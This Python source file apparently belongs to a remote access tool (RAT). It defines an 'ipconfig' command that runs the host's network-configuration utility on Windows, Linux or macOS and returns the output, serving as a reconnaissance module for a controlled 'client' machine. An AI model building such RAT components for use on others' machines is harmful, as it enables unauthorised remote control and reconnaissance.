import platform
import subprocess
from rat.commands.base_command import BaseCommand


class IPConfigCommand(BaseCommand):

    name = "ipconfig"
    description = "Get the client's network configuration"

    def execute(self, args: str) -> str:

        system = platform.system()

        try:

            if system == "Windows":

                cmd = ["ipconfig"]

            elif system == "Linux":

                cmd = ["ip", "addr"]

            elif system == "Darwin":

                cmd = ["ifconfig"]

            else:

                return f"Unsupported OS: {system}"

            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
            )

            if result.returncode != 0:

                return result.stderr

            return result.stdout

        except Exception as e:

            return f"ipconfig error: {e}"
